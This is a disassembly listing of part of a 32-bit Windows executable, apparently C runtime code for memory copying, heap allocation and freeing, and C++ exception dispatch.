  405074:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  405078:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  40507c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  405080:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  405084:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  405088:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  40508c:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  405090:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  405094:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  405098:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  40509c:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4050a3:	03 f0                	add    %eax,%esi
  4050a5:	03 f8                	add    %eax,%edi
  4050a7:	ff 24 95 b0 50 40 00 	jmp    *0x4050b0(,%edx,4)
  4050ae:	8b ff                	mov    %edi,%edi
  4050b0:	c0 50 40 00          	rclb   $0x0,0x40(%eax)
  4050b4:	c8 50 40 00          	enter  $0x4050,$0x0
  4050b8:	d8 50 40             	fcoms  0x40(%eax)
  4050bb:	00 ec                	add    %ch,%ah
  4050bd:	50                   	push   %eax
  4050be:	40                   	inc    %eax
  4050bf:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4050c5:	c9                   	leave
  4050c6:	c3                   	ret
  4050c7:	90                   	nop
  4050c8:	8a 46 03             	mov    0x3(%esi),%al
  4050cb:	88 47 03             	mov    %al,0x3(%edi)
  4050ce:	8b 45 08             	mov    0x8(%ebp),%eax
  4050d1:	5e                   	pop    %esi
  4050d2:	5f                   	pop    %edi
  4050d3:	c9                   	leave
  4050d4:	c3                   	ret
  4050d5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4050d8:	8a 46 03             	mov    0x3(%esi),%al
  4050db:	88 47 03             	mov    %al,0x3(%edi)
  4050de:	8a 46 02             	mov    0x2(%esi),%al
  4050e1:	88 47 02             	mov    %al,0x2(%edi)
  4050e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4050e7:	5e                   	pop    %esi
  4050e8:	5f                   	pop    %edi
  4050e9:	c9                   	leave
  4050ea:	c3                   	ret
  4050eb:	90                   	nop
  4050ec:	8a 46 03             	mov    0x3(%esi),%al
  4050ef:	88 47 03             	mov    %al,0x3(%edi)
  4050f2:	8a 46 02             	mov    0x2(%esi),%al
  4050f5:	88 47 02             	mov    %al,0x2(%edi)
  4050f8:	8a 46 01             	mov    0x1(%esi),%al
  4050fb:	88 47 01             	mov    %al,0x1(%edi)
  4050fe:	8b 45 08             	mov    0x8(%ebp),%eax
  405101:	5e                   	pop    %esi
  405102:	5f                   	pop    %edi
  405103:	c9                   	leave
  405104:	c3                   	ret
  405105:	ff 35 4c c1 40 00    	push   0x40c14c
  40510b:	ff 74 24 08          	push   0x8(%esp)
  40510f:	e8 03 00 00 00       	call   0x405117
  405114:	59                   	pop    %ecx
  405115:	59                   	pop    %ecx
  405116:	c3                   	ret
  405117:	83 7c 24 04 e0       	cmpl   $0xffffffe0,0x4(%esp)
  40511c:	77 22                	ja     0x405140
  40511e:	ff 74 24 04          	push   0x4(%esp)
  405122:	e8 1c 00 00 00       	call   0x405143
  405127:	85 c0                	test   %eax,%eax
  405129:	59                   	pop    %ecx
  40512a:	75 16                	jne    0x405142
  40512c:	39 44 24 08          	cmp    %eax,0x8(%esp)
  405130:	74 10                	je     0x405142
  405132:	ff 74 24 04          	push   0x4(%esp)
  405136:	e8 ca 18 00 00       	call   0x406a05
  40513b:	85 c0                	test   %eax,%eax
  40513d:	59                   	pop    %ecx
  40513e:	75 de                	jne    0x40511e
  405140:	33 c0                	xor    %eax,%eax
  405142:	c3                   	ret
  405143:	56                   	push   %esi
  405144:	8b 74 24 08          	mov    0x8(%esp),%esi
  405148:	3b 35 a0 be 40 00    	cmp    0x40bea0,%esi
  40514e:	77 0b                	ja     0x40515b
  405150:	56                   	push   %esi
  405151:	e8 5e 1c 00 00       	call   0x406db4
  405156:	85 c0                	test   %eax,%eax
  405158:	59                   	pop    %ecx
  405159:	75 1c                	jne    0x405177
  40515b:	85 f6                	test   %esi,%esi
  40515d:	75 03                	jne    0x405162
  40515f:	6a 01                	push   $0x1
  405161:	5e                   	pop    %esi
  405162:	83 c6 0f             	add    $0xf,%esi
  405165:	83 e6 f0             	and    $0xfffffff0,%esi
  405168:	56                   	push   %esi
  405169:	6a 00                	push   $0x0
  40516b:	ff 35 e0 c3 40 00    	push   0x40c3e0
  405171:	ff 15 90 90 40 00    	call   *0x409090
  405177:	5e                   	pop    %esi
  405178:	c3                   	ret
  405179:	56                   	push   %esi
  40517a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40517e:	85 f6                	test   %esi,%esi
  405180:	74 24                	je     0x4051a6
  405182:	56                   	push   %esi
  405183:	e8 d6 18 00 00       	call   0x406a5e
  405188:	59                   	pop    %ecx
  405189:	85 c0                	test   %eax,%eax
  40518b:	56                   	push   %esi
  40518c:	74 0a                	je     0x405198
  40518e:	50                   	push   %eax
  40518f:	e8 f5 18 00 00       	call   0x406a89
  405194:	59                   	pop    %ecx
  405195:	59                   	pop    %ecx
  405196:	5e                   	pop    %esi
  405197:	c3                   	ret
  405198:	6a 00                	push   $0x0
  40519a:	ff 35 e0 c3 40 00    	push   0x40c3e0
  4051a0:	ff 15 94 90 40 00    	call   *0x409094
  4051a6:	5e                   	pop    %esi
  4051a7:	c3                   	ret
  4051a8:	55                   	push   %ebp
  4051a9:	8b ec                	mov    %esp,%ebp
  4051ab:	56                   	push   %esi
  4051ac:	8b 75 18             	mov    0x18(%ebp),%esi
  4051af:	57                   	push   %edi
  4051b0:	bf 20 05 93 19       	mov    $0x19930520,%edi
  4051b5:	39 3e                	cmp    %edi,(%esi)
  4051b7:	74 05                	je     0x4051be
  4051b9:	e8 94 08 00 00       	call   0x405a52
  4051be:	8b 45 08             	mov    0x8(%ebp),%eax
  4051c1:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  4051c5:	74 1f                	je     0x4051e6
  4051c7:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4051cb:	74 6f                	je     0x40523c
  4051cd:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  4051d1:	75 69                	jne    0x40523c
  4051d3:	6a ff                	push   $0xffffffff
  4051d5:	56                   	push   %esi
  4051d6:	ff 75 14             	push   0x14(%ebp)
  4051d9:	ff 75 0c             	push   0xc(%ebp)
  4051dc:	e8 0e 03 00 00       	call   0x4054ef
  4051e1:	83 c4 10             	add    $0x10,%esp
  4051e4:	eb 56                	jmp    0x40523c
  4051e6:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  4051ea:	74 50                	je     0x40523c
  4051ec:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4051f2:	75 2c                	jne    0x405220
  4051f4:	39 78 14             	cmp    %edi,0x14(%eax)
  4051f7:	76 27                	jbe    0x405220
  4051f9:	8b 48 1c             	mov    0x1c(%eax),%ecx
  4051fc:	8b 49 08             	mov    0x8(%ecx),%ecx
  4051ff:	85 c9                	test   %ecx,%ecx
  405201:	74 1d                	je     0x405220
  405203:	0f b6 55 24          	movzbl 0x24(%ebp),%edx
  405207:	52                   	push   %edx
  405208:	ff 75 20             	push   0x20(%ebp)
  40520b:	ff 75 1c             	push   0x1c(%ebp)
  40520e:	56                   	push   %esi
  40520f:	ff 75 14             	push   0x14(%ebp)
  405212:	ff 75 10             	push   0x10(%ebp)
  405215:	ff 75 0c             	push   0xc(%ebp)
  405218:	50                   	push   %eax
  405219:	ff d1                	call   *%ecx
  40521b:	83 c4 20             	add    $0x20,%esp
  40521e:	eb 1f                	jmp    0x40523f
  405220:	ff 75 20             	push   0x20(%ebp)
  405223:	ff 75 1c             	push   0x1c(%ebp)
  405226:	ff 75 24             	push   0x24(%ebp)
  405229:	56                   	push   %esi
  40522a:	ff 75 14             	push   0x14(%ebp)
  40522d:	ff 75 10             	push   0x10(%ebp)
  405230:	ff 75 0c             	push   0xc(%ebp)
  405233:	50                   	push   %eax
  405234:	e8 0a 00 00 00       	call   0x405243
  405239:	83 c4 20             	add    $0x20,%esp
  40523c:	6a 01                	push   $0x1
  40523e:	58                   	pop    %eax
  40523f:	5f                   	pop    %edi
  405240:	5e                   	pop    %esi
  405241:	5d                   	pop    %ebp
  405242:	c3                   	ret
  405243:	55                   	push   %ebp
  405244:	8b ec                	mov    %esp,%ebp
  405246:	83 ec 18             	sub    $0x18,%esp
  405249:	8b 45 0c             	mov    0xc(%ebp),%eax
  40524c:	80 65 ec 00          	andb   $0x0,-0x14(%ebp)
  405250:	8b 40 08             	mov    0x8(%eax),%eax
  405253:	83 f8 ff             	cmp    $0xffffffff,%eax
  405256:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405259:	7c 08                	jl     0x405263
  40525b:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40525e:	3b 41 04             	cmp    0x4(%ecx),%eax
  405261:	7c 05                	jl     0x405268
  405263:	e8 ea 07 00 00       	call   0x405a52
  405268:	53                   	push   %ebx
  405269:	56                   	push   %esi
  40526a:	8b 75 08             	mov    0x8(%ebp),%esi
  40526d:	bb 63 73 6d e0       	mov    $0xe06d7363,%ebx
  405272:	57                   	push   %edi
  405273:	bf 20 05 93 19       	mov    $0x19930520,%edi
  405278:	39 1e                	cmp    %ebx,(%esi)
  40527a:	0f 85 3f 01 00 00    	jne    0x4053bf
  405280:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  405284:	75 56                	jne    0x4052dc
  405286:	39 7e 14             	cmp    %edi,0x14(%esi)
  405289:	75 51                	jne    0x4052dc
  40528b:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  40528f:	75 4b                	jne    0x4052dc
  405291:	8b 35 dc bf 40 00    	mov    0x40bfdc,%esi
  405297:	85 f6                	test   %esi,%esi
  405299:	0f 84 1b 01 00 00    	je     0x4053ba
  40529f:	a1 e0 bf 40 00       	mov    0x40bfe0,%eax
  4052a4:	6a 01                	push   $0x1
  4052a6:	56                   	push   %esi
  4052a7:	89 45 10             	mov    %eax,0x10(%ebp)
  4052aa:	c6 45 ec 01          	movb   $0x1,-0x14(%ebp)
  4052ae:	e8 1a 20 00 00       	call   0x4072cd
  4052b3:	59                   	pop    %ecx
  4052b4:	85 c0                	test   %eax,%eax
  4052b6:	59                   	pop    %ecx
  4052b7:	75 05                	jne    0x4052be
  4052b9:	e8 94 07 00 00       	call   0x405a52
  4052be:	39 1e                	cmp    %ebx,(%esi)
  4052c0:	0f 85 f9 00 00 00    	jne    0x4053bf
  4052c6:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  4052ca:	75 10                	jne    0x4052dc
  4052cc:	39 7e 14             	cmp    %edi,0x14(%esi)
  4052cf:	75 0b                	jne    0x4052dc
  4052d1:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  4052d5:	75 05                	jne    0x4052dc
  4052d7:	e8 76 07 00 00       	call   0x405a52
  4052dc:	39 1e                	cmp    %ebx,(%esi)
  4052de:	0f 85 db 00 00 00    	jne    0x4053bf
  4052e4:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  4052e8:	0f 85 d1 00 00 00    	jne    0x4053bf
  4052ee:	39 7e 14             	cmp    %edi,0x14(%esi)
  4052f1:	0f 85 c8 00 00 00    	jne    0x4053bf
  4052f7:	8b 7d f0             	mov    -0x10(%ebp),%edi
  4052fa:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4052fd:	50                   	push   %eax
  4052fe:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405301:	50                   	push   %eax
  405302:	57                   	push   %edi
  405303:	ff 75 20             	push   0x20(%ebp)
  405306:	ff 75 18             	push   0x18(%ebp)
  405309:	e8 bf e8 ff ff       	call   0x403bcd
  40530e:	83 c4 14             	add    $0x14,%esp
  405311:	8b d8                	mov    %eax,%ebx
  405313:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405316:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  405319:	0f 83 8b 00 00 00    	jae    0x4053aa
  40531f:	39 3b                	cmp    %edi,(%ebx)
  405321:	7f 7c                	jg     0x40539f
  405323:	3b 7b 04             	cmp    0x4(%ebx),%edi
  405326:	7f 77                	jg     0x40539f
  405328:	8b 43 10             	mov    0x10(%ebx),%eax
  40532b:	89 45 08             	mov    %eax,0x8(%ebp)
  40532e:	8b 43 0c             	mov    0xc(%ebx),%eax
  405331:	85 c0                	test   %eax,%eax
  405333:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405336:	7e 64                	jle    0x40539c
  405338:	8b 46 1c             	mov    0x1c(%esi),%eax
  40533b:	8b 40 0c             	mov    0xc(%eax),%eax
  40533e:	8d 78 04             	lea    0x4(%eax),%edi
  405341:	8b 00                	mov    (%eax),%eax
  405343:	85 c0                	test   %eax,%eax
  405345:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405348:	7e 1f                	jle    0x405369
  40534a:	ff 76 1c             	push   0x1c(%esi)
  40534d:	ff 37                	push   (%edi)
  40534f:	ff 75 08             	push   0x8(%ebp)
  405352:	e8 3b 01 00 00       	call   0x405492
  405357:	83 c4 0c             	add    $0xc,%esp
  40535a:	85 c0                	test   %eax,%eax
  40535c:	75 1a                	jne    0x405378
  40535e:	ff 4d f8             	decl   -0x8(%ebp)
  405361:	83 c7 04             	add    $0x4,%edi
  405364:	39 45 f8             	cmp    %eax,-0x8(%ebp)
  405367:	7f e1                	jg     0x40534a
  405369:	ff 4d f4             	decl   -0xc(%ebp)
  40536c:	83 45 08 10          	addl   $0x10,0x8(%ebp)
  405370:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  405374:	7f c2                	jg     0x405338
  405376:	eb 24                	jmp    0x40539c
  405378:	ff 75 ec             	push   -0x14(%ebp)
  40537b:	ff 75 24             	push   0x24(%ebp)
  40537e:	ff 75 20             	push   0x20(%ebp)
  405381:	53                   	push   %ebx
  405382:	ff 37                	push   (%edi)
  405384:	ff 75 08             	push   0x8(%ebp)
  405387:	ff 75 18             	push   0x18(%ebp)
  40538a:	ff 75 14             	push   0x14(%ebp)
  40538d:	ff 75 10             	push   0x10(%ebp)
  405390:	ff 75 0c             	push   0xc(%ebp)
  405393:	56                   	push   %esi
  405394:	e8 0a 02 00 00       	call   0x4055a3
  405399:	83 c4 2c             	add    $0x2c,%esp
  40539c:	8b 7d f0             	mov    -0x10(%ebp),%edi
  40539f:	ff 45 fc             	incl   -0x4(%ebp)
  4053a2:	83 c3 14             	add    $0x14,%ebx
  4053a5:	e9 69 ff ff ff       	jmp    0x405313
  4053aa:	80 7d 1c 00          	cmpb   $0x0,0x1c(%ebp)
  4053ae:	74 0a                	je     0x4053ba
  4053b0:	6a 01                	push   $0x1
  4053b2:	56                   	push   %esi
  4053b3:	e8 60 05 00 00       	call   0x405918
  4053b8:	59                   	pop    %ecx
  4053b9:	59                   	pop    %ecx
  4053ba:	5f                   	pop    %edi
  4053bb:	5e                   	pop    %esi
  4053bc:	5b                   	pop    %ebx
  4053bd:	c9                   	leave
  4053be:	c3                   	ret
  4053bf:	80 7d 1c 00          	cmpb   $0x0,0x1c(%ebp)
  4053c3:	75 20                	jne    0x4053e5
  4053c5:	ff 75 24             	push   0x24(%ebp)
  4053c8:	ff 75 20             	push   0x20(%ebp)
  4053cb:	ff 75 f0             	push   -0x10(%ebp)
  4053ce:	ff 75 18             	push   0x18(%ebp)
  4053d1:	ff 75 14             	push   0x14(%ebp)
  4053d4:	ff 75 10             	push   0x10(%ebp)
  4053d7:	ff 75 0c             	push   0xc(%ebp)
  4053da:	56                   	push   %esi
  4053db:	e8 0a 00 00 00       	call   0x4053ea
  4053e0:	83 c4 20             	add    $0x20,%esp
  4053e3:	eb d5                	jmp    0x4053ba
  4053e5:	e9 12 06 00 00       	jmp    0x4059fc
  4053ea:	55                   	push   %ebp
  4053eb:	8b ec                	mov    %esp,%ebp
  4053ed:	51                   	push   %ecx
  4053ee:	51                   	push   %ecx
  4053ef:	83 3d e4 bf 40 00 00 	cmpl   $0x0,0x40bfe4
  4053f6:	56                   	push   %esi
  4053f7:	57                   	push   %edi
  4053f8:	74 21                	je     0x40541b
  4053fa:	ff 75 24             	push   0x24(%ebp)
  4053fd:	ff 75 20             	push   0x20(%ebp)
  405400:	ff 75 18             	push   0x18(%ebp)
  405403:	ff 75 14             	push   0x14(%ebp)
  405406:	ff 75 10             	push   0x10(%ebp)
  405409:	ff 75 0c             	push   0xc(%ebp)
  40540c:	ff 75 08             	push   0x8(%ebp)
  40540f:	e8 90 e6 ff ff       	call   0x403aa4
  405414:	83 c4 1c             	add    $0x1c,%esp
  405417:	85 c0                	test   %eax,%eax
  405419:	75 73                	jne    0x40548e
  40541b:	8b 7d 1c             	mov    0x1c(%ebp),%edi
  40541e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405421:	50                   	push   %eax
  405422:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405425:	50                   	push   %eax
  405426:	57                   	push   %edi
  405427:	ff 75 20             	push   0x20(%ebp)
  40542a:	ff 75 18             	push   0x18(%ebp)
  40542d:	e8 9b e7 ff ff       	call   0x403bcd
  405432:	83 c4 14             	add    $0x14,%esp
  405435:	8b f0                	mov    %eax,%esi
  405437:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40543a:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  40543d:	73 4f                	jae    0x40548e
  40543f:	3b 3e                	cmp    (%esi),%edi
  405441:	7c 43                	jl     0x405486
  405443:	3b 7e 04             	cmp    0x4(%esi),%edi
  405446:	7f 3e                	jg     0x405486
  405448:	8b 46 0c             	mov    0xc(%esi),%eax
  40544b:	8b 4e 10             	mov    0x10(%esi),%ecx
  40544e:	c1 e0 04             	shl    $0x4,%eax
  405451:	03 c1                	add    %ecx,%eax
  405453:	8b 48 f4             	mov    -0xc(%eax),%ecx
  405456:	85 c9                	test   %ecx,%ecx
  405458:	74 06                	je     0x405460
  40545a:	80 79 08 00          	cmpb   $0x0,0x8(%ecx)
  40545e:	75 26                	jne    0x405486
  405460:	6a 01                	push   $0x1
  405462:	83 c0 f0             	add    $0xfffffff0,%eax
  405465:	ff 75 24             	push   0x24(%ebp)
  405468:	ff 75 20             	push   0x20(%ebp)
  40546b:	56                   	push   %esi
  40546c:	6a 00                	push   $0x0
  40546e:	50                   	push   %eax
  40546f:	ff 75 18             	push   0x18(%ebp)
  405472:	ff 75 14             	push   0x14(%ebp)
  405475:	ff 75 10             	push   0x10(%ebp)
  405478:	ff 75 0c             	push   0xc(%ebp)
  40547b:	ff 75 08             	push   0x8(%ebp)
  40547e:	e8 20 01 00 00       	call   0x4055a3
  405483:	83 c4 2c             	add    $0x2c,%esp
  405486:	ff 45 fc             	incl   -0x4(%ebp)
  405489:	83 c6 14             	add    $0x14,%esi
  40548c:	eb a9                	jmp    0x405437
  40548e:	5f                   	pop    %edi
  40548f:	5e                   	pop    %esi
  405490:	c9                   	leave
  405491:	c3                   	ret
  405492:	56                   	push   %esi
  405493:	57                   	push   %edi
  405494:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  405498:	8b 47 04             	mov    0x4(%edi),%eax
  40549b:	85 c0                	test   %eax,%eax
  40549d:	74 4a                	je     0x4054e9
  40549f:	80 78 08 00          	cmpb   $0x0,0x8(%eax)
  4054a3:	8d 50 08             	lea    0x8(%eax),%edx
  4054a6:	74 41                	je     0x4054e9
  4054a8:	8b 74 24 10          	mov    0x10(%esp),%esi
  4054ac:	8b 4e 04             	mov    0x4(%esi),%ecx
  4054af:	3b c1                	cmp    %ecx,%eax
  4054b1:	74 10                	je     0x4054c3
  4054b3:	83 c1 08             	add    $0x8,%ecx
  4054b6:	51                   	push   %ecx
  4054b7:	52                   	push   %edx
  4054b8:	e8 b3 0f 00 00       	call   0x406470
  4054bd:	59                   	pop    %ecx
  4054be:	85 c0                	test   %eax,%eax
  4054c0:	59                   	pop    %ecx
  4054c1:	75 22                	jne    0x4054e5
  4054c3:	f6 06 02             	testb  $0x2,(%esi)
  4054c6:	74 05                	je     0x4054cd
  4054c8:	f6 07 08             	testb  $0x8,(%edi)
  4054cb:	74 18                	je     0x4054e5
  4054cd:	8b 44 24 14          	mov    0x14(%esp),%eax
  4054d1:	8b 00                	mov    (%eax),%eax
  4054d3:	a8 01                	test   $0x1,%al
  4054d5:	74 05                	je     0x4054dc
  4054d7:	f6 07 01             	testb  $0x1,(%edi)
  4054da:	74 09                	je     0x4054e5
  4054dc:	a8 02                	test   $0x2,%al
  4054de:	74 09                	je     0x4054e9
  4054e0:	f6 07 02             	testb  $0x2,(%edi)
  4054e3:	75 04                	jne    0x4054e9
  4054e5:	33 c0                	xor    %eax,%eax
  4054e7:	eb 03                	jmp    0x4054ec
  4054e9:	6a 01                	push   $0x1
  4054eb:	58                   	pop    %eax
  4054ec:	5f                   	pop    %edi
  4054ed:	5e                   	pop    %esi
  4054ee:	c3                   	ret
  4054ef:	55                   	push   %ebp
  4054f0:	8b ec                	mov    %esp,%ebp
  4054f2:	6a ff                	push   $0xffffffff
  4054f4:	68 38 92 40 00       	push   $0x409238
  4054f9:	68 04 62 40 00       	push   $0x406204
  4054fe:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405504:	50                   	push   %eax
  405505:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40550c:	83 ec 0c             	sub    $0xc,%esp
  40550f:	53                   	push   %ebx
  405510:	56                   	push   %esi
  405511:	57                   	push   %edi
  405512:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405515:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405518:	8b 73 08             	mov    0x8(%ebx),%esi
  40551b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40551e:	8b 7d 10             	mov    0x10(%ebp),%edi
  405521:	3b 75 14             	cmp    0x14(%ebp),%esi
  405524:	74 55                	je     0x40557b
  405526:	83 fe ff             	cmp    $0xffffffff,%esi
  405529:	7e 05                	jle    0x405530
  40552b:	3b 77 04             	cmp    0x4(%edi),%esi
  40552e:	7c 05                	jl     0x405535
  405530:	e8 1d 05 00 00       	call   0x405a52
  405535:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405539:	8b 47 08             	mov    0x8(%edi),%eax
  40553c:	8b 44 f0 04          	mov    0x4(%eax,%esi,8),%eax
  405540:	85 c0                	test   %eax,%eax
  405542:	74 0c                	je     0x405550
  405544:	68 03 01 00 00       	push   $0x103
  405549:	53                   	push   %ebx
  40554a:	50                   	push   %eax
  40554b:	e8 60 04 00 00       	call   0x4059b0
  405550:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405554:	eb 1a                	jmp    0x405570
  405556:	ff 75 ec             	push   -0x14(%ebp)
  405559:	e8 2f 00 00 00       	call   0x40558d
  40555e:	59                   	pop    %ecx
  40555f:	c3                   	ret
  405560:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405563:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405567:	8b 7d 10             	mov    0x10(%ebp),%edi
  40556a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40556d:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  405570:	8b 47 08             	mov    0x8(%edi),%eax
  405573:	8b 34 f0             	mov    (%eax,%esi,8),%esi
  405576:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  405579:	eb a6                	jmp    0x405521
  40557b:	89 73 08             	mov    %esi,0x8(%ebx)
  40557e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405581:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405588:	5f                   	pop    %edi
  405589:	5e                   	pop    %esi
  40558a:	5b                   	pop    %ebx
  40558b:	c9                   	leave
  40558c:	c3                   	ret
  40558d:	8b 44 24 04          	mov    0x4(%esp),%eax
  405591:	8b 00                	mov    (%eax),%eax
  405593:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  405599:	74 03                	je     0x40559e
  40559b:	33 c0                	xor    %eax,%eax
  40559d:	c3                   	ret
  40559e:	e9 59 04 00 00       	jmp    0x4059fc
  4055a3:	55                   	push   %ebp
  4055a4:	8b ec                	mov    %esp,%ebp
  4055a6:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  4055aa:	53                   	push   %ebx
  4055ab:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  4055ae:	56                   	push   %esi
  4055af:	57                   	push   %edi
  4055b0:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4055b3:	74 10                	je     0x4055c5
  4055b5:	ff 75 20             	push   0x20(%ebp)
  4055b8:	53                   	push   %ebx
  4055b9:	57                   	push   %edi
  4055ba:	ff 75 08             	push   0x8(%ebp)
  4055bd:	e8 92 01 00 00       	call   0x405754
  4055c2:	83 c4 10             	add    $0x10,%esp
  4055c5:	83 7d 2c 00          	cmpl   $0x0,0x2c(%ebp)
  4055c9:	ff 75 08             	push   0x8(%ebp)
  4055cc:	75 03                	jne    0x4055d1
  4055ce:	57                   	push   %edi
  4055cf:	eb 03                	jmp    0x4055d4
  4055d1:	ff 75 2c             	push   0x2c(%ebp)
  4055d4:	e8 cd e3 ff ff       	call   0x4039a6
  4055d9:	8b 75 24             	mov    0x24(%ebp),%esi
  4055dc:	ff 36                	push   (%esi)
  4055de:	ff 75 18             	push   0x18(%ebp)
  4055e1:	ff 75 14             	push   0x14(%ebp)
  4055e4:	57                   	push   %edi
  4055e5:	e8 05 ff ff ff       	call   0x4054ef
  4055ea:	8b 46 04             	mov    0x4(%esi),%eax
  4055ed:	68 00 01 00 00       	push   $0x100
  4055f2:	ff 75 28             	push   0x28(%ebp)
  4055f5:	40                   	inc    %eax
  4055f6:	89 47 08             	mov    %eax,0x8(%edi)
  4055f9:	ff 73 0c             	push   0xc(%ebx)
  4055fc:	ff 75 18             	push   0x18(%ebp)
  4055ff:	ff 75 10             	push   0x10(%ebp)
  405602:	57                   	push   %edi
  405603:	ff 75 08             	push   0x8(%ebp)
  405606:	e8 13 00 00 00       	call   0x40561e
  40560b:	83 c4 2c             	add    $0x2c,%esp
  40560e:	85 c0                	test   %eax,%eax
  405610:	74 07                	je     0x405619
  405612:	57                   	push   %edi
  405613:	50                   	push   %eax
  405614:	e8 4b e3 ff ff       	call   0x403964
  405619:	5f                   	pop    %edi
  40561a:	5e                   	pop    %esi
  40561b:	5b                   	pop    %ebx
  40561c:	5d                   	pop    %ebp
  40561d:	c3                   	ret
  40561e:	55                   	push   %ebp
  40561f:	8b ec                	mov    %esp,%ebp
  405621:	6a ff                	push   $0xffffffff
  405623:	68 48 92 40 00       	push   $0x409248
  405628:	68 04 62 40 00       	push   $0x406204
  40562d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405633:	50                   	push   %eax
  405634:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40563b:	83 ec 1c             	sub    $0x1c,%esp
  40563e:	53                   	push   %ebx
  40563f:	56                   	push   %esi
  405640:	57                   	push   %edi
  405641:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405644:	8b 45 18             	mov    0x18(%ebp),%eax
  405647:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40564a:	33 db                	xor    %ebx,%ebx
  40564c:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  40564f:	8b 75 0c             	mov    0xc(%ebp),%esi
  405652:	8b 4e fc             	mov    -0x4(%esi),%ecx
  405655:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  405658:	8b 0d dc bf 40 00    	mov    0x40bfdc,%ecx
  40565e:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  405661:	8b 0d e0 bf 40 00    	mov    0x40bfe0,%ecx
  405667:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40566a:	8b 7d 08             	mov    0x8(%ebp),%edi
  40566d:	89 3d dc bf 40 00    	mov    %edi,0x40bfdc
  405673:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405676:	89 0d e0 bf 40 00    	mov    %ecx,0x40bfe0
  40567c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40567f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405686:	ff 75 20             	push   0x20(%ebp)
  405689:	ff 75 1c             	push   0x1c(%ebp)
  40568c:	50                   	push   %eax
  40568d:	ff 75 14             	push   0x14(%ebp)
  405690:	56                   	push   %esi
  405691:	e8 95 e3 ff ff       	call   0x403a2b
  405696:	83 c4 14             	add    $0x14,%esp
  405699:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40569c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40569f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4056a3:	e8 3c 00 00 00       	call   0x4056e4
  4056a8:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4056ab:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4056ae:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4056b5:	5f                   	pop    %edi
  4056b6:	5e                   	pop    %esi
  4056b7:	5b                   	pop    %ebx
  4056b8:	c9                   	leave
  4056b9:	c3                   	ret
  4056ba:	ff 75 ec             	push   -0x14(%ebp)
  4056bd:	e8 68 00 00 00       	call   0x40572a
  4056c2:	59                   	pop    %ecx
  4056c3:	c3                   	ret
  4056c4:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4056c7:	83 65 d4 00          	andl   $0x0,-0x2c(%ebp)
  4056cb:	6a ff                	push   $0xffffffff
